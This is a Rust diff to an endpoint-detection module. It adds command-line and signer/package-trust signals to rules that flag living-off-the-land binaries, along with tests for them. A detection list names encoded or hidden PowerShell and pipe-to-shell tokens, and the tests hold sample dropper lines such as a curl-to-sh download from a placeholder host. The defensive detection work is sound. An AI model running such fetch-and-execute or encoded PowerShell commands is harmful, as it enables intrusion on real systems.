@@ -12,11 +12,15 @@
 //! `1 = Informational`, `2 = Low`, `3 = Medium`, `4 = High`. An execution's
 //! `severity_id` is the MAX over its rule hits, or `1` when nothing fired.
 //!
-//! # Honest limits
-//! Today the ruleset only sees the process **image** (path or short comm name).
-//! Command line, file hash, signer, and parent process are not available on the
-//! stub bus and are deliberate follow-ups; a benign binary invoked from a
-//! suspicious path, or a renamed LOLBin, will be judged on name/path alone.
+//! # Enriched context
+//! Beyond the process **image** (path / short comm name), the ruleset also uses
+//! the **command line** and a **provenance-trust** signal (package-owned on
+//! Linux / signed on Windows) WHEN the backend supplies them — a LOLBin with an
+//! abuse-shaped command line escalates to High, and a trusted binary in a
+//! suspicious directory is not flagged on path alone. The image **hash** is
+//! carried in the record for forensics. On the stub bus none of these are present
+//! and the module behaves exactly as the image-only ruleset did. Parent-process
+//! ancestry is the next follow-up (correlation, not this module).
 use async_trait::async_trait;
 use std::collections::HashMap;
 use std::sync::atomic::{AtomicU64, AtomicUsize, Ordering};
@@ -94,6 +98,41 @@ const LOLBINS: &[&str] = &[
 /// for dropped payloads; execution FROM one of these is a weak-but-useful signal.
 const SUSPICIOUS_PATHS: &[&str] = &[r"\temp\", r"\downloads\", "/tmp/", "/dev/shm/", "/var/tmp/"];
 
+/// Command-line tokens (case-insensitive substrings) that strongly indicate abuse
+/// when combined with a LOLBin: encoded/hidden PowerShell, in-memory download +
+/// execute, pipe-to-interpreter one-liners, and certutil download/decode. These
+/// are only meaningful with the command line, which the enriched event carries.
+const SUSPICIOUS_CMDLINE: &[&str] = &[
+    "-enc",
+    "-encodedcommand",
+    "-nop",
+    "-noprofile",
+    "-w hidden",
+    "-windowstyle hidden",
+    "iex",
+    "invoke-expression",
+    "downloadstring",
+    "frombase64string",
+    "| sh",
+    "|sh",
+    "| bash",
+    "|bash",
+    "-urlcache",
+    "-decode",
+];
+
+/// The enriched context for one exec: the image plus (when the backend provides
+/// them) the command line and a provenance-trust signal. `image_trusted` is
+/// `Some(true)` for a package-owned binary (Linux) or a validly-signed binary
+/// (Windows), `Some(false)` when checked and neither, and `None` when unknown
+/// (e.g. the stub bus). `assess(image)` is the image-only special case.
+#[derive(Default, Clone, Copy)]
+pub struct ProcCtx<'a> {
+    pub image: &'a str,
+    pub cmdline: Option<&'a str>,
+    pub image_trusted: Option<bool>,
+}
+
 /// Reduces an image to a lowercased basename: strips the directory (last `\` or
 /// `/`) and a trailing `.exe`. Pure; used for LOLBin matching.
 fn basename(image: &str) -> String {
@@ -113,6 +152,9 @@ fn rule_severity(rule: &str) -> u8 {
         // Correlated signal: a LOLBin launched FROM a suspicious path is worse
         // than either weak signal on its own, so it earns a strictly HIGHER band.
         "lolbin_in_suspicious_path" => SEV_HIGH,
+        // A LOLBin invoked with an abuse-shaped command line (encoded/hidden
+        // PowerShell, download+exec, pipe-to-shell) — a strong combined signal.
+        "lolbin_suspicious_cmdline" => SEV_HIGH,
         // Lifecycle correlation: an already-suspicious image that exits quickly.
         "short_lived_suspicious" => SEV_MEDIUM,
         _ => SEV_INFORMATIONAL,
@@ -120,12 +162,23 @@ fn rule_severity(rule: &str) -> u8 {
 }
 
 /// Assess a process image (full path or short comm name). Pure + deterministic:
-/// no I/O, no OS, no allocation beyond the returned hits.
+/// no I/O, no OS. The image-only special case of [`assess_ctx`].
 pub fn assess(image: &str) -> Assessment {
+    assess_ctx(&ProcCtx {
+        image,
+        cmdline: None,
+        image_trusted: None,
+    })
+}
+
+/// Assess an enriched exec context (image + optional command line + provenance
+/// trust). Pure + deterministic: no I/O, no OS. New inputs are function params,
+/// never I/O inside the rule.
+pub fn assess_ctx(ctx: &ProcCtx) -> Assessment {
     let mut hits: Vec<RuleHit> = Vec::new();
 
     // (a) LOLBin / dual-use by basename (case-insensitive, .exe-stripped).
-    let base = basename(image);
+    let base = basename(ctx.image);
     let is_lolbin = LOLBINS.contains(&base.as_str());
     if is_lolbin {
         hits.push(RuleHit {
@@ -134,29 +187,45 @@ pub fn assess(image: &str) -> Assessment {
         });
     }
 
-    // (b) Suspicious launch directory (case-insensitive substring).
-    let lower = image.to_lowercase();
+    // (b) Suspicious launch directory (case-insensitive substring) — SUPPRESSED
+    // for a trusted (package-owned / signed) binary, which is very likely a
+    // legitimate tool that merely lives in such a directory (fewer FPs).
+    let lower = ctx.image.to_lowercase();
+    let trusted = ctx.image_trusted == Some(true);
     let suspicious_dir = SUSPICIOUS_PATHS.iter().find(|p| lower.contains(**p));
-    if let Some(pat) = suspicious_dir {
+    let path_hit = suspicious_dir.filter(|_| !trusted);
+    if let Some(pat) = path_hit {
         hits.push(RuleHit {
             rule: "suspicious_path",
             reason: format!("image path contains suspicious directory '{pat}'"),
         });
     }
 
-    // (c) Correlated HIGH signal: a LOLBin executing FROM a suspicious directory
-    // (a dual-use payload staged in a world-writable / temp path) is materially
-    // worse than either weak signal alone, so it fires its own HIGH-severity rule.
-    // This gives the MAX-over-hits severity a genuinely differentiated band to
-    // pick, rather than every rule collapsing to Medium.
+    // (c) Correlated HIGH: a LOLBin executing FROM a suspicious directory (only
+    // when the path hit stands — a trusted binary doesn't escalate here either).
     if is_lolbin {
-        if let Some(pat) = suspicious_dir {
+        if let Some(pat) = path_hit {
             hits.push(RuleHit {
                 rule: "lolbin_in_suspicious_path",
                 reason: format!(
                     "living-off-the-land binary '{base}' launched from suspicious directory '{pat}'"
                 ),
             });
+        }
+    }
+
+    // (d) Correlated HIGH: a LOLBin with an abuse-shaped command line. Requires
+    // the enriched cmdline; independent of path (catches encoded PowerShell and
+    // download-and-execute one-liners run from anywhere).
+    if is_lolbin {
+        if let Some(cmd) = ctx.cmdline {
+            let cl = cmd.to_lowercase();
+            if let Some(tok) = SUSPICIOUS_CMDLINE.iter().find(|t| cl.contains(**t)) {
+                hits.push(RuleHit {
+                    rule: "lolbin_suspicious_cmdline",
+                    reason: format!("LOLBin '{base}' invoked with suspicious argument '{tok}'"),
+                });
+            }
         }
     }
 
@@ -273,14 +342,40 @@ fn handle_exec(
         Some(s) => s,
         None => return,
     };
+    // Enriched context (present only when the backend supplies it; absent on the
+    // stub bus → behaves exactly as the image-only ruleset did).
+    let cmdline = ev.fields.get("cmdline").and_then(serde_json::Value::as_str);
+    let image_sha256 = ev
+        .fields
+        .get("image_sha256")
+        .and_then(serde_json::Value::as_str);
+    let image_trusted = ev
+        .fields
+        .get("image_trusted")
+        .and_then(serde_json::Value::as_bool);
 
-    // ---- exec emit: preserved byte-for-byte from the original handler ----
-    let a = assess(image);
+    let a = assess_ctx(&ProcCtx {
+        image,
+        cmdline,
+        image_trusted,
+    });
     let detections: Vec<serde_json::Value> = a
         .hits
         .iter()
         .map(|h| serde_json::json!({ "rule": h.rule, "reason": h.reason }))
         .collect();
+
+    // Carry the enriched attributes into the record for forensics (only when known).
+    let mut process = serde_json::json!({ "pid": pid, "image": image });
+    if let Some(c) = cmdline {
+        process["cmdline"] = serde_json::json!(c);
+    }
+    if let Some(h) = image_sha256 {
+        process["image_sha256"] = serde_json::json!(h);
+    }
+    if let Some(t) = image_trusted {
+        process["image_trusted"] = serde_json::json!(t);
+    }
 
     let mut env = OcsfEnvelope::new(
         class::PROCESS_ACTIVITY,
@@ -289,7 +384,7 @@ fn handle_exec(
         device.clone(),
         serde_json::json!({
             "activity": "exec",
-            "process": { "pid": pid, "image": image },
+            "process": process,
             "detections": detections,
         }),
     );
@@ -562,6 +657,83 @@ mod tests {
             a.severity_id, SEV_MEDIUM,
             "max differs from the lower Medium hits"
         );
+    }
+
+    // ---------- enriched-context (P0-2) rule tests ----------
+
+    fn ctx<'a>(image: &'a str, cmdline: Option<&'a str>, trusted: Option<bool>) -> ProcCtx<'a> {
+        ProcCtx {
+            image,
+            cmdline,
+            image_trusted: trusted,
+        }
+    }
+
+    #[test]
+    fn lolbin_with_encoded_cmdline_escalates_to_high() {
+        // Real powershell (a LOLBin) with an encoded, hidden command line is a
+        // strong combined signal even though its path is a normal system path.
+        let a = assess_ctx(&ctx(
+            r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
+            Some("powershell -nop -w hidden -enc SQBFAFgA"),
+            Some(true), // even a signed system powershell: the CMDLINE is the tell
+        ));
+        assert_eq!(a.severity_id, SEV_HIGH);
+        assert!(rules(&a).contains(&"lolbin_suspicious_cmdline"));
+    }
+
+    #[test]
+    fn lolbin_download_pipe_to_shell_escalates() {
+        // `curl` is a LOLBin; piping to sh is the classic dropper one-liner.
+        let a = assess_ctx(&ctx(
+            "/usr/bin/curl",
+            Some("curl -fsSL http://x/y.sh | sh"),
+            Some(true),
+        ));
+        assert!(rules(&a).contains(&"lolbin_suspicious_cmdline"));
+        assert_eq!(a.severity_id, SEV_HIGH);
+    }
+
+    #[test]
+    fn benign_lolbin_cmdline_does_not_escalate() {
+        // A LOLBin with an ordinary command line stays at the plain lolbin band.
+        let a = assess_ctx(&ctx(
+            "/usr/bin/curl",
+            Some("curl https://example.com -o /tmp/f"),
+            Some(true),
+        ));
+        assert!(!rules(&a).contains(&"lolbin_suspicious_cmdline"));
+        // (curl is a lolbin so it's Medium; the point is no cmdline escalation.)
+        assert_eq!(a.severity_id, SEV_MEDIUM);
+    }
+
+    #[test]
+    fn trusted_binary_in_suspicious_path_is_not_flagged() {
+        // A package-owned/signed binary that merely lives under /var/tmp is very
+        // likely legitimate — the path rule is suppressed (FP reduction).
+        let a = assess_ctx(&ctx("/var/tmp/vendor-tool", None, Some(true)));
+        assert!(
+            a.hits.is_empty(),
+            "trusted binary suppresses suspicious_path"
+        );
+        assert_eq!(a.severity_id, SEV_INFORMATIONAL);
+    }
+
+    #[test]
+    fn untrusted_binary_in_suspicious_path_still_flags() {
+        // Not trusted (or unknown) → the path rule fires as before (no regression).
+        let a = assess_ctx(&ctx("/var/tmp/dropped", None, Some(false)));
+        assert_eq!(rules(&a), vec!["suspicious_path"]);
+        assert_eq!(a.severity_id, SEV_MEDIUM);
+        // And image-only assess (trust unknown) is unchanged.
+        assert_eq!(rules(&assess("/tmp/evil")), vec!["suspicious_path"]);
+    }
+
+    #[test]
+    fn image_only_assess_is_unchanged_by_enrichment() {
+        // The image-only wrapper must behave identically to before P0-2.
+        assert_eq!(rules(&assess("nc")), vec!["lolbin"]);
+        assert_eq!(assess("/usr/bin/echo").severity_id, SEV_INFORMATIONAL);
     }
 
     // ---------- pure assess_lifecycle tests ----------
